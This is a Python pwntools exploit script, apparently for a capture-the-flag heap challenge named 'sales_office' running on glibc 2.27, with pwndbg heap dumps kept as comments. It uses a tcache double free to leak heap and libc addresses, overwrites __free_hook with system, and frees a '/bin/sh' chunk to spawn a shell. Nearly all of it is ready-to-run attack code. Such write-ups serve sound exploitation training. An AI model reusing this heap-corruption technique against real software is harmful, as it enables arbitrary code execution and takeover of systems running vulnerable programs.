from pwn import *
context.arch='amd64'
context.log_level='DEBUG'

# nop@nop-pwn:~/Desktop$ patchelf --set-interpreter /home/nop/libs/2.27/glibc-2.27/64/lib/ld-2.27.so sales_office
# nop@nop-pwn:~/Desktop$ patchelf --set-rpath /home/nop/libs/2.27/glibc-2.27/64/lib/ sales_office


p = process('./sales_office')
elf = ELF('./sales_office',checksec=False)
libc = ELF('/home/nop/libs/2.27/glibc-2.27/64/lib/libc.so.6',checksec=False)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

def buy(size,content):
	ru("choice:")
	s(1)
	ru("Please input the size of your house:")
	s(size)
	ru("please decorate your house:")
	s(content)

def show(index):
	ru("choice:")
	s(3)
	ru("index:")
	s(index)
	ru("house:")
	ru('\n')
	data = ru('\n')
	return data

def sell(index):
	ru("choice:")
	s(4)
	ru("index:")
	s(index)

def dbg():
	gdb.attach(p)
	pause()

buy(0x10,'A') # id0
buy(0x10,'B') # id1
buy(0x10,'C') # id2
buy(0x10,'D') # id3
sell(1)
sell(0)
sell(0)

# dbg()
# pwndbg> x/16g 0x1c18250 
# 0x1c18250:	0x0000000000000000	0x0000000000000021
# 0x1c18260:	0x0000000001c18280	0x0000000000000010
# 0x1c18270:	0x0000000000000000	0x0000000000000021 <-- id0
# 0x1c18280:	0x0000000001c18260	0x0000000000000000
# 0x1c18290:	0x0000000000000000	0x0000000000000021
# 0x1c182a0:	0x0000000001c182c0	0x0000000000000010
# 0x1c182b0:	0x0000000000000000	0x0000000000000021 <--id1

heap_base = uu64(show(0)) - 0x260
leak("heap_base",heap_base)

buy(0x10,p64(heap_base+0x2a0)) # id4
# addr                prev                size                 status              fd                bk                
# 0x104d000           0x0                 0x250                Used                None              None
# 0x104d250           0x0                 0x20                 Freed          0x104d280              None
# 0x104d270           0x0                 0x20                 Freed          0x104d2a0              None <--id0
# 0x104d290           0x0                 0x20                 Freed          0x104d2c0              None
# 0x104d2b0           0x0                 0x20                 Freed                0x0              None <--id1
# 0x104d2d0           0x0                 0x20                 Used                None              None
# 0x104d2f0           0x0                 0x20                 Used                None              None
# 0x104d310           0x0                 0x20                 Used                None              None
# 0x104d330           0x0                 0x20                 Used 

buy(0x20,'FFFFF') # id5
# addr                prev                size                 status              fd                bk                
# 0x21b0000           0x0                 0x250                Used                None              None
# 0x21b0250           0x0                 0x20                 Used                None              None
# 0x21b0270           0x0                 0x20                 Freed          0x21b02a0              None <--id0
# 0x21b0290           0x0                 0x20                 Freed          0x21b02c0              None
# 0x21b02b0           0x0                 0x20                 Freed                0x0              None <--id1
# 0x21b02d0           0x0                 0x20                 Used                None              None
# 0x21b02f0           0x0                 0x20                 Used                None              None
# 0x21b0310           0x0                 0x20                 Used                None              None
# 0x21b0330           0x0                 0x20                 Used                None              None
# 0x21b0350           0x0                 0x30                 Used 

buy(0x10,p64(elf.got['read'])) # id6
# addr                prev                size                 status              fd                bk                
# 0x1da6000           0x0                 0x250                Used                None              None
# 0x1da6250           0x0                 0x20                 Used                None              None
# 0x1da6270           0x0                 0x20                 Used                None              None <--id0
# 0x1da6290           0x0                 0x20                 Used                None              None
# 0x1da62b0           0x0                 0x20                 Freed                0x0              None <--id1
# 0x1da62d0           0x0                 0x20                 Used                None              None
# 0x1da62f0           0x0                 0x20                 Used                None              None
# 0x1da6310           0x0                 0x20                 Used                None              None
# 0x1da6330           0x0                 0x20                 Used                None              None
# 0x1da6350           0x0                 0x30                 Used 

read_addr = uu64(show(1))
leak("read_addr",read_addr)

system_addr = read_addr - (libc.sym['read'] - libc.sym['system'])
leak("system_addr",system_addr)

free_hook = read_addr - (libc.sym['read'] - libc.sym['__free_hook'])
leak("free_hook",free_hook)

sell(3)
sell(3)
# addr                prev                size                 status              fd                bk   
# 0x1ec8000           0x0                 0x250                Used                None              None
# 0x1ec8250           0x0                 0x20                 Used                None              None
# 0x1ec8270           0x0                 0x20                 Used                None              None
# 0x1ec8290           0x0                 0x20                 Used                None              None
# 0x1ec82b0           0x0                 0x20                 Used                None              None
# 0x1ec82d0           0x0                 0x20                 Used                None              None
# 0x1ec82f0           0x0                 0x20                 Used                None              None
# 0x1ec8310           0x0                 0x20                 Freed          0x1ec8340              None
# 0x1ec8330           0x0                 0x20                 Freed          0x1ec8320              None <--id3
# 0x1ec8350           0x0                 0x30                 Used                None  

buy(0x10,p64(free_hook)) # id7
# addr                prev                size                 status              fd                bk                
# ......
# 0x183a310           0x0                 0x20                 Freed          0x183a340              None
# 0x183a330           0x0                 0x20                 Freed     0x7fe0e4c078c8              None <id3
# 0x183a350           0x0                 0x30                 Used

buy(0x20,'/bin/sh\x00') #id8
# addr                prev                size                 status              fd                bk                
# ......
# 0xa66310            0x0                 0x20                 Used                None              None
# 0xa66330            0x0                 0x20                 Freed     0x7efc5cecd8c8              None <--id3
# 0xa66350            0x0                 0x30                 Used                None              None
# 0xa66380            0x0                 0x30                 Used  

buy(0x10,p64(system_addr))
# pwndbg> x/16g 0x885330 
# 0x885330:	0x0000000000000000	0x0000000000000021
# 0x885340:	0x00007f24932018c8	0x0000000000000010
# 0x885350:	0x0000000000000000	0x0000000000000031
# 0x885360:	0x0000004646464646	0x0000000000000000
# 0x885370:	0x0000000000000000	0x0000000000000000
# 0x885380:	0x0000000000000000	0x0000000000000031
# 0x885390:	0x0068732f6e69622f	0x0000000000000000
# 0x8853a0:	0x0000000000000000	0x0000000000000000
# pwndbg> x/16g 0x00007f24932018c8
# 0x7f24932018c8 <__free_hook>:	0x00007f2492ea0c47	0x0000000000000000
# 0x7f24932018d8 <next_to_use>:	0x0000000000000000	0x0000000000000000

# dbg()

sell(8)
itr()
